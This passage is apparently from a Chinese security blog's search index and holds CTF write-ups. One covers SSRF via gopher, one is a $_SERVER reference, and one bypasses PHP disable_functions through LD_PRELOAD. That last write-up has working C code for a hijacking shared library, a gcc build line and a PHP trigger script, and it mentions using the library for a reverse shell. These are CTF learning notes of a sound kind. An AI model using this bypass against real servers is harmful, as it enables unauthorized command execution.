class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的攻击流量需要再次url编码后才行。</p><p>写入一句话之后就可以进行命令执行啦。</p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub中SSRF使用POST</title>
      <link href="/2021/09/10/ctfhub-zhong-ssrf-shi-yong-post/"/>
      <url>/2021/09/10/ctfhub-zhong-ssrf-shi-yong-post/</url>
      
        <content type="html"><![CDATA[<h2 id="审计flag-php"><a href="#审计flag-php" class="headerlink" title="审计flag.php"></a>审计flag.php</h2><p>这里有一个点是<code>$_SERVER["REMOTE_ADDR"]</code>是“可靠”的请求端ip地址，是服务端在进行TCP握手时获得的，从技术上来说是几乎不可能伪造的，与<code>$_SERVER["HTTP_X_FORWARDED_FOR"]</code>和<code>$_SERVER["HTTP_CLIENT_IP"]</code>这两个可以通过修改http报头轻松伪造的参数不同。</p><p><strong>记得gopher的默认端口是70，如果要发送请求到其它端口，记得修改</strong></p><p>简化一下流程：</p><pre><code>1.侦测注入点2.找到攻击对象，如“flag.php”3.构造gopher数据（最常见的就是通过本地请求，本地抓包，然后手动或者脚本构造）4.进行攻击</code></pre><blockquote><p>参考</p><p><a href="https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/" target="_blank" rel="noopener">https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LD_PRELOAD</title>
      <link href="/2021/09/10/bypass-disable-function/"/>
      <url>/2021/09/10/bypass-disable-function/</url>
      
        <content type="html"><![CDATA[<h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ul><li>通过LD_PRELOAD方法绕过disabled_functions限制</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>绕过disabled_functions的四种手法</p><ol><li>攻击后端组件，寻找存在命令注入的web应用常用后端组件，如<strong>ImageMagick</strong>的魔图漏洞、<strong>bash</strong>的破壳漏洞等</li><li>寻找未禁用的函数，常见命令执行的函数有<strong>system()</strong>、<strong>exec()</strong>、<strong>shell_exec()</strong>、<strong>passthru()</strong>，偏僻的<strong>popen()</strong>、<strong>proc_open()</strong>、<strong>pcntl_exec()</strong>等等，逐一尝试</li><li>mod_cgi模式，尝试修改.htaccess，调整请求访问路由，绕过php.ini中的任何限制（让特定扩展名的文件直接和php-cgi通信）</li><li>利用环境变量<strong>LD_PRELOAD</strong>劫持系统函数，让外部程序加载恶意*.so，达到执行系统命令的效果</li></ol><p>此处只详细说明第四种方法。大致步骤如下</p><ul><li>生成一个自己的恶意动态链接库文件</li><li>利用<strong>putenv</strong>设置LD_PRELOAD为自己的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发自己的恶意动态链接库文件</li><li>RCE并获取flag</li></ul><p>这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。</p><h2 id="什么是LD-PRELOAD"><a href="#什么是LD-PRELOAD" class="headerlink" title="什么是LD_PRELOAD"></a>什么是LD_PRELOAD</h2><p>LD_PRELOAD是linux中的一个环境变量，它可以影响程序运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要用作有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或者更好的函数（无需别人的源码），而另一方面，我们也可以向别人的程序中注入恶意程序。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>php.ini配置如下：</p><pre class="line-numbers language-php"><code class="language-php">disable_functions<span class="token operator">=</span>pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_get_handler<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>pcntl_async_signals<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>link<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>dl<span class="token punctuation">,</span>mail<span class="token punctuation">,</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>linux系统</li><li><strong>putenv</strong>未被禁用</li><li><strong>mail</strong>或<strong>error_log</strong>至少需要有一个未被禁用</li><li>存在可写目录，需要上传<strong>.so</strong>文件</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>mail</strong>或<strong>error_log</strong>函数会调用<strong>sendmail</strong>，而<strong>sendmail</strong>会调用<strong>geteuid</strong>函数，所以将其重写覆盖即可达到目的。</p><h2 id="题目做法"><a href="#题目做法" class="headerlink" title="题目做法"></a>题目做法</h2><p>CTFHub中LD_PRELOAD题目环境给了<strong>readflag</strong>文件，即可直接调用</p><p>创建<strong>hack.c</strong>文件</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有一种优化版本</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">xxx</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用<code>gcc -fPIC -shared hack.c -o hack.so</code>编译出动态链接库<strong>hack.so</strong>文件</p><p>上传到<code>/tmp/</code>目录下，一般来说<code>/tmp/</code>目录都是有读写权限的</p><p>调用脚本：</p><p>shell.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=/tmp/hack.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">"a@localhost"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用 LD_PRELOAD 环境变量, 加载 hack.so, 在 hack.so 中执行命令.</p><p>我们可以直接利用 hack.so 反弹 shell, 或者将输出重定向到文件当中</p><blockquote><p>参考</p><p><a href="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">警惕UNIX下的LD_PRELOAD环境变量</a></p><p><a href="https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/74ASRSoQTq8x2VatRWJR7R.html" target="_blank" rel="noopener">LD_PRELOAD</a></p><p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1" target="_blank" rel="noopener">AntSword-Labs</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LD_PRELOAD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LD_PRELOA </tag>
            
            <tag> Bypass_disable_function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>$_SERVER详解</title>
      <link href="/2021/09/10/server-xiang-jie/"/>
      <url>/2021/09/10/server-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h1><p><a href="https://www.php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">官方文档</a></p><p>$_SERVER – $HTTP_SERVER_VARS [已删除] — 服务器和执行环境信息</p><hr><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>如果以<a href="https://www.php.net/manual/zh/features.commandline.php" target="_blank" rel="noopener">命令行</a>方式运行 PHP，下面列出的元素几乎没有有效的(或是没有任何实际意义的)</p><p>$_SERVER[‘HTTP_ACCEPT_LANGUAGE’]</p><p>浏览器语言<br>$_SERVER[‘REMOTE_ADDR’] </p><p>当前用户 IP 。<br>$_SERVER[‘REMOTE_HOST’] </p><p>当前用户主机名<br>$_SERVER[‘REQUEST_URI’] </p><p>URL</p><p>$_SERVER[‘REMOTE_PORT’] </p><p>端口。<br>$_SERVER[‘SERVER_NAME’] </p><p>服务器主机的名称。<br>$_SERVER[‘PHP_SELF’]</p><p>正在执行脚本的文件名<br>$_SERVER[‘argv’]</p><p>传递给该脚本的参数。<br>$_SERVER[‘argc’] </p><p>传递给程序的命令行参数的个数。<br>$_SERVER[‘GATEWAY_INTERFACE’]</p><p>CGI 规范的版本。<br>$_SERVER[‘SERVER_SOFTWARE’] </p><p>服务器标识的字串<br>$_SERVER[‘SERVER_PROTOCOL’] </p><p>请求页面时通信协议的名称和版本<br>$_SERVER[‘REQUEST_METHOD’]</p><p>访问页面时的请求方法<br>$_SERVER[‘QUERY_STRING’] </p><p>查询(query)的字符串。<br>$_SERVER[‘DOCUMENT_ROOT’] </p><p>当前运行脚本所在的文档根目录<br>$_SERVER[‘HTTP_ACCEPT’] </p><p>当前请求的 Accept: 头部的内容。<br>$_SERVER[‘HTTP_ACCEPT_CHARSET’] </p><p>当前请求的 Accept-Charset: 头部的内容。<br>$_SERVER[‘HTTP_ACCEPT_ENCODING’] </p><p>当前请求的 Accept-Encoding: 头部的内容<br>$_SERVER[‘HTTP_CONNECTION’] </p><p>当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。<br>$_SERVER[‘HTTP_HOST’] </p><p>当前请求的 Host: 头部的内容。<br>$_SERVER[‘HTTP_REFERER’] </p><p>链接到当前页面的前一页面的 URL 地址。<br>$_SERVER[‘HTTP_USER_AGENT’] </p><p>当前请求的 User_Agent: 头部的内容。<br>$_SERVER[‘HTTPS’]</p><p>如果通过https访问,则被设为一个非空的值(on)，否则返回off<br>$_SERVER[‘SCRIPT_FILENAME’] </p><p>当前执行脚本的绝对路径名。<br>$_SERVER[‘SERVER_ADMIN’] </p><p>管理员信息<br>$_SERVER[‘SERVER_PORT’] </p><p>服务器所使用的端口<br>$_SERVER[‘SERVER_SIGNATURE’] </p><p>包含服务器版本和虚拟主机名的字符串。<br>$_SERVER[‘PATH_TRANSLATED’] </p><p>当前脚本所在文件系统（不是文档根目录）的基本路径。<br>$_SERVER[‘SCRIPT_NAME’] </p><p>包含当前脚本的路径。这在页面需要指向自己时非常有用。<br>$_SERVER[‘PHP_AUTH_USER’] </p><p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。<br>$_SERVER[‘PHP_AUTH_PW’] </p><p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。<br>$_SERVER[‘AUTH_TYPE’] </p><p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
